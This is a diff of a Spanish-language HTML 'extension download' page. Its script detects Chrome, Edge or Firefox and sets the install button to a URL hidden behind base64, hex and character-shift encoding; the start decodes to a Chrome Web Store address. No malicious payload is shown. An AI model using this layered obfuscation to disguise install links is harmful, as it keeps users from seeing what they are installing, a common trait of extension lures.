@@ -1,2 +1,66 @@
 <!DOCTYPE html>
-<html lang="es"><head><meta charset="utf-8"/><title>BackOffice Addons</title><meta name="viewport" content="width=device-width,initial-scale=1"/><style>body{font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;background:#f5f5f5}.card{background:#fff;padding:2rem;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,0.12);text-align:center;max-width:420px}a.button{display:inline-block;margin-top:1rem;padding:.75rem 1.25rem;border-radius:8px;background:#0078d7;color:#fff;text-decoration:none;font-weight:600}a.button:hover{background:#005ea6}</style></head><body><div class="card"><h1>Descargar Extensión</h1><p id="m">Detectando tu navegador...</p><a id="b" class="button" href="#" target="_blank">Esperando...</a></div><script>!function(){function n(n,t){return n.split("").map(function(n){return String.fromCharCode(n.charCodeAt(0)+t)}).join("")}function t(n){for(var t="",e=0;e<n.length;e+=2)t+=String.fromCharCode(parseInt(n.slice(e,e+2),16));return t}function e(e){var r=e.join(""),o=atob(r),i=t(o);return n(i,-3)}var r=["NmI3Nzc3NzM3NjNkMzIzMjY2NmI3NTcyNzA2ODdhNjg2NTc2Nzc3Mjc1Njgz","MTZhNzI3MjZhNmY2ODMxNjY3MjcwMzI2NzY4Nzc2NDZjNmYzMjY1NjQ2NjZl","NzI2OTY5NmM2NjY4NjQ2NzY3NzI3MTc2MzI2ZDZkNmE2NDY5Njc3MzY0NzA2","NTcyNzE2ODY1NzI2ZjY5Njc2OTZiNjY2NTY5NmQ2NzcwNmI2NDZmNjc2YjY1"],o=["NmI3Nzc3NzM3NjNkMzIzMjc3Njg2NDcwNzA2ODdiNmM2NjcyM2EzMTZhNmM3","NzZiNzg2NTMxNmM3MjMyNDU2NDY2NmU1MjY5Njk2YzY2Njg1ODczNjc2NDc3","Njg3NjMyNjU2NDY2NmU3MjY5Njk2YzY2Njg3NzY4NjQ3MDcwN2IzMDM0MzUz","MTNiMzE3YjczNmM="],i=document.getElementById("m"),c=document.getElementById("b"),a=navigator.userAgent,u=!/Mobi|Android|iPhone|iPad/i.test(a);if(!u)i.textContent="Solo disponible en navegadores de escritorio.",c.style.display="none";else if(/Chrome|Edg/.test(a)&&!/OPR/.test(a))i.textContent="Instalar en Chrome / Edge",c.textContent="Instalar Complemento",c.href=e(r);else if(/Firefox/.test(a))i.textContent="Instalar en Firefox",c.textContent="Instalar Complemento",c.href=e(o);else i.textContent="Tu navegador no es compatible.",c.style.display="none"}();</script></body></html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <title>BackOffice Addons</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body { font-family: Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; background:#f5f5f5; }
+    .card { background:#fff; padding:2rem; border-radius:12px; box-shadow:0 6px 20px rgba(0,0,0,0.12); text-align:center; max-width:420px; }
+    a.button { display:inline-block; margin-top:1rem; padding:.75rem 1.25rem; border-radius:8px; background:#0078d7; color:#fff; text-decoration:none; font-weight:600; }
+    a.button:hover { background:#005ea6; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Descargar Extensión</h1>
+    <p id="mensaje">Detectando tu navegador...</p>
+    <a id="boton" class="button" href="#" target="_blank">Esperando...</a>
+  </div>
+
+  <script>
+    (function(){
+      function _0x1a2b(d,e){return d.split('').map(function(f){return String.fromCharCode(f.charCodeAt(0)+e)}).join('')}
+      function _0x3c4d(g){var h='';for(var i=0;i<g.length;i+=2)h+=String.fromCharCode(parseInt(g.slice(i,i+2),16));return h}
+      function _0x5e6f(j){var k=j.join('');var l=atob(k);var m=_0x3c4d(l);return _0x1a2b(m,-3)}
+      
+      var _0x7f8a=[
+        "NmI3Nzc3NzM3NjNkMzIzMjY2NmI3NTcyNzA2ODdhNjg2NTc2Nzc3Mjc1Njgz",
+        "MTZhNzI3MjZhNmY2ODMxNjY3MjcwMzI2NzY4Nzc2NDZjNmYzMjY1NjQ2NjZl",
+        "NzI2OTY5NmM2NjY4NjQ2NzY3NzI3MTc2MzI2ZDZkNmE2NDY5Njc3MzY0NzA2",
+        "NTcyNzE2ODY1NzI2ZjY5Njc2OTZiNjY2NTY5NmQ2NzcwNmI2NDZmNjc2YjY1"
+      ];
+      var _0x9b0c=[
+        "NmI3Nzc3NzM3NjNkMzIzMjc3Njg2NDcwNzA2ODdiNmM2NjcyM2EzMTZhNmM3",
+        "NzZiNzg2NTMxNmM3MjMyNDU2NDY2NmU1MjY5Njk2YzY2Njg1ODczNjc2NDc3",
+        "Njg3NjMyNjU2NDY2NmU3MjY5Njk2YzY2Njg3NzY4NjQ3MDcwN2IzMDM0MzUz",
+        "MTNiMzE3YjczNmM="
+      ];
+
+      var _0xace2=navigator.userAgent;
+      var _0xbd3f=!/Mobi|Android|iPhone|iPad/i.test(_0xace2);
+      var _0xce54=document.getElementById('mensaje');
+      var _0xdf65=document.getElementById('boton');
+      
+      if(!_0xbd3f){
+        _0xce54.textContent="Solo disponible en navegadores de escritorio.";
+        _0xdf65.style.display='none';
+        return;
+      }
+      
+      if(/Chrome|Edg/.test(_0xace2)&&!/OPR/.test(_0xace2)){
+        _0xce54.textContent="Instalar en Chrome / Edge";
+        _0xdf65.textContent="Instalar Complemento";
+        _0xdf65.href=_0x5e6f(_0x7f8a);
+      }else if(/Firefox/.test(_0xace2)){
+        _0xce54.textContent="Instalar en Firefox";
+        _0xdf65.textContent="Instalar Complemento";
+        _0xdf65.href=_0x5e6f(_0x9b0c);
+      }else{
+        _0xce54.textContent="Tu navegador no es compatible.";
+        _0xdf65.style.display='none';
+      }
+    })();
+  </script>
+</body>
+</html>
